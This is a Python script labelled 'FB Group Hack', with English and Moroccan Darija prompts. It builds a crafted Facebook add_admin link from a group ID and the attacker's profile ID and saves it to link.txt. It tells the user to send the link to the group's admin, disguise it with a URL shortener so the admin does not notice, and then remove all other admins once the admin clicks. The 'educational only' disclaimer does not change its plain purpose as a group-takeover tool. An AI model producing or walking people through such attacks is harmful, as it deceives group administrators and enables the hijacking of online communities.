import os, sys, time

# Set Colors ######

N = '\033[0m'

W = '\033[1;37m'

B = '\033[1;34m'

R = '\033[1;31m'

G = '\033[1;32m'

Y = '\033[1;33m'

C = '\033[1;36m'


##################


# Restart ####################

def restart_program():
  python = sys.executable

  os.execl( python, python, *sys.argv )

  curdir = os.getcwd()


##############################


os.system( "clear" )

print("%s ____ ___ %s" % (W, N))

print("%s / __// o.) %s.__ %s . . . %s" % (W, B, R, N))

print("%s / _/ / o \ %s[ __._._ . .[_) %s|_| _. _.;_/ %s" % (W, B, R, N))

print("%s /_/ /___,' %s[_./[ (_)(_|[_)%s | |(_](_.| \ %s" % (W, B, R, N))

print(" %s============================%s|%s======================%s " % (C, B, C, N))

print(" %sFB%s Group%s Hack %s2021/1/27%s1:12 PM%s" % (W, B, R, C, Y, N))

print(" %sDevelop by: %sYOUNESS %s$$$%sED WERD%s" % (W, R, W, Y, N))

print(" %sCode: %sPython%s" % (W, C, N))

print(" %sFB: %shttps://m.facebook.com/profile.php?id=100053435141883%s" % (W, B, N))

print(" %sThis purpose is for educational only%s" % (C, N))

print(" %sI take no responsibilities for the use of this%s" % (Y, N))

print(" %sprogram%s" % (Y, N))

print("%s ===================================================%s" % (C, N))

print

print(" %sLanguage/logha:%s" % (W, N))

print

print("%s (%s01%s)%s -- %sEnglish%s" % (B, C, B, Y, W, N))

print("%s (%s02%s)%s -- %sdarija %s" % (B, C, B, Y, W, N))

print

bahasa = raw_input("%s[%s*%s] %s/Choose/3zal atbi:%s " % (C, Y, C, W, B) )

try:

  file = open( "link.txt", 'w' )

except(IOError):

  print
  "ERROR"

  sys.exit()

if bahasa.strip() in "01 1".split():

  print("%s [%s English%s ]%s" % (C, W, C, N))

  print

  step1 = raw_input("%s1%s)%s First Of All Go To The %sFacebook%s Group That You Want To %sHack%s...%s[%sEnter%s]%s" % (Y, C, W, B, W, R, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  step2 = raw_input("%s2%s)%s After That. Go Click On The Group Url And Then Copy 15 Digits Group Magical Code. Example %s(%s 589101351254979 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  step3 = raw_input("%s3%s)%s Now Go To Your Profile And Find Your 15 Digits Profile Code. Example %s(%s 100004136748473 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  step4 = raw_input("%s4%s)%s If the url didnt show that 15 digit code. Then try to open %sfacebook%s from the browser...%s[%sEnter%s]%s" % (Y, C, W, B, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  step5 = raw_input("%s5%s)%s After Find Both Codes..%sLet we mix it up%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N) )

  group = raw_input( " %s(%sa%s)%s Group Code%s >>>%s " % (W, C, W, C, R, Y) )

  you = raw_input( " %s(%sb%s)%s Your Code%s >>>%s " % (W, C, W, C, R, Y) )

  print(" %s(%s*%s)%s Result%s >>>%s https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, group, you, N))

  file.write( "https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (group, you) )

  print("%s--------------------%s" % (R, N))

  step6 = raw_input("%s6%s)%s Now Copy The Link On The Result And Then Send Copied Link To %sAdmin%s Of The Group. If Its Hard To You To Copy The Link, I Have Save The Link On File *link.txt*. So Its Getting Easier, Just Open The File link.txt And Then Copy The Link Then Send To The %sAdmin%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  step7 = raw_input("%s7%s)%s You Just Need To Wait Till The %sAdmin%s Click On The Link that You Send. Then You Will Be %sAdmin%s Of The Group...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  step8 = raw_input("%s8%s)%s Now Don't Waste Your Time. Go To Group Settings And Remove All %sAdmins%s From The Group...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  step9 = raw_input( "%s9%s)%s Have Fun %s:)%s...%s[%sEnter%s]%s" % (Y, C, W, Y, W, C, Y, C, N) )

  print("%s[%s#%s]%s -------------------%s Done %s-------------------- %s[%s#%s]%s" % (C, Y, C, B, W, R, C, Y, C, N))

  print

  time.sleep( 1 )

  print("%s*note:clever admin can notice the link just by one blink. So i suggest you to use shortlink like goo.gl or bit.ly etc*%s" % (
  Y, N))

  time.sleep( 1 )

  print("%sThanks%s For %sUsing My Program%s %s:')%s" % (C, W, R, W, Y, N))

  time.sleep( 1 )

  print("%sGood Bye %s:)%s" % (W, Y, N))


elif bahasa.strip() in "02 2".split():

  print(" %s[%s darija%s ]%s" % (R, W, R, N))

  print

  tahap1 = raw_input("%s1%s)%s ana ghanmchi m3ak d9a d9a , sir flowal l%sgroup dial lfacabook%s li baghi twli fih %sadmin%s...%s[%sEnter%s](matktab walo hna ghir warak 3la ~ENTER~ wla na9az star)%s" % (Y, C, W, B, W, R, W, C, Y, C, N))

  print ("%s--------------------%s" % (R, N))

  tahap2 = raw_input("%s2%s)%s daba rakaz m3aya , ghatmchi tjbad URL dial lgroup o howa li katkon fih %smatalan %s(%swww.facebook....%s )%s...%s[%sEnter%s](lamafhmtich mzyan ghir kaml rah ghanfahmk )%s" % (Y, C, W, R, C, B, C, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  tahap3 = raw_input("%s3%s)%s bnisba lnas li jbdo URL , ghadi tdir copie ldak 15 ra9m fla5ar.matalan%s ghaykon f7al hada %s(%s 100004136748473 %s)%s...%s[%sEnter%s](bnisba li ba9i majbdoch tab3 m3aya )%s" % ( Y, C, W, R, C, B, C, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  tahap4 = raw_input("%s4%s)%s daba ghatmchi tjbad lien dial profil dialk o ghadi tdir copie ldak 15 ra9m.(kima 9alt li ba9i mal9ach hadchi ytaba3 m3aya)...%s[%sEnter%s]%s" % ( Y, C, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  tahap5 = raw_input("%s5%s)%s daba bnisba li mal9awch hadchi .hanta ghtmchi t7ol %sfacebook%s dialk mn google o ghadi td5ol lgroup li baghi twli fih admin o ghatwark lfo9 fin mktob lien ghtl9ah mktob fhal haka (ww.facebook...) o ghatdir lih copie  o mn ba3d ghadi tl9a 15 ra9m flkhar ghatdir lihom copie 7it homa lmohimin o nafs chkal l lien dyal profil dyalk ghadi t7lo mn google o ta5d 15 ra9m li flkhr...%s[%sEnter%s](ila mal9itich 15 ra9m f lien dial profil dyalk taba3 m3aya )%s" % (Y, C, W, B, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  tahap6 = raw_input("%s6%s)%s bnisba li mal9ach 15 ra9m f lien dial %sfacebook%s dialo . ktab dik ljomla li katkon fla5ar matalan %s(www.facebook.com/^^^^^^^)%s hadik ljomla li fla5ar lighadi tdir liha copie...%s[%sEnter%s]%s" % (Y, C, W, B, W, R, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  grup = raw_input( " %s(%sa%s)%s ktab lcode dial lgroup li fih 15 ra9m%s >>>%s " % (W, C, W, C, R, Y) )

  ita = raw_input( " %s(%sb%s)%s ktab lcode dialk nta li fih 15 ra9m%s >>>%s " % (W, C, W, C, R, Y) )

  print(" %s(%s*%s)%s Lien%s >>> %shttps://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, grup, ita, N))

  file.write( "https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (grup, ita) )

  print("%s--------------------%s" % (R, N))

  tahap7 = raw_input("%s7%s)%s daba ghadi ta5d had lien li tla3 lik o ghadi tdir lih copie o tlo7o l admin f message o fach ghadi yd5ol lih ghadi twli admin ila khrjti mn programme wla drti ktar mn lien o bghiti tl9a li drtihom 9bal 5ask 9bal matd5ol lprogramme ghadi tl9a wahd lmilf smito (link.txt) howa li ghaykono fih ga3 les lien labghiti td5ol lih dir ( cat link.txt)...%s[%sEnter%s]%s" % ( Y, C, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))

  tahap8 = raw_input("%s8%s)%s daba ma3lik ghir tsna l%sadmin%s yd5ol l lien...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N) )

  print("%s--------------------%s" % (R, N))
  B, W, C

  tahap9 = raw_input("%s9%s)%s matdya3ch lwa9t ila d5al l admin l lien o wliti %sadmin%s, 5ask tzrab o t5araj ga3 les %sadmin%s bach tb9a nta %sadmin%s lwa7id...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, R, W, C, Y, C, N) )

  print( "%s--------------------%s" % (R, N) )

  tahap10 = raw_input( "%s10%s)%s HAVE FUN asat  %s:)%s...%s[%sEnter%s]%s" % (Y, C, W, Y, W, C, Y, C, N) )

  print("%s[%s#%s]%s ------------------%s dor t9awad %s------------------ %s[%s#%s]%s" % (C, Y, C, B, W, R, C, Y, C, N))

  print

  time.sleep( 1 )

  print("%s*NOTE ===> y9dar dak khona li ghtsift lih lien y3i9 wla chi 9lwa . nta bach tkon m2akad ghayd5ol . ghata5d dak lien o ghatmchi rah kinin bzaf dial mawa9i3 kidiro *short link* kirj3o dak lien fchkal w7da5or bach may3i9ch %s" % (Y, N))

  time.sleep( 1 )

  print("%s THANKS atbi%s 7it khdamti bhad l%sprogramme%s %s:')%s" % (C, W, R, W, Y, N))

  time.sleep( 1 )

  print("%sTla7 atbi%s:)%s" % (W, Y, N))

  sys.exit()



else:

  print

  print("%s[%si%s]%s 3zal ra9m dyal logha li baghi nta%s" % (Y, R, Y, W, N))

  print("%s[%si%s]%s choose your language %s" % (Y, R, Y, W, N))

  time.sleep( 3 )

  restart_program()

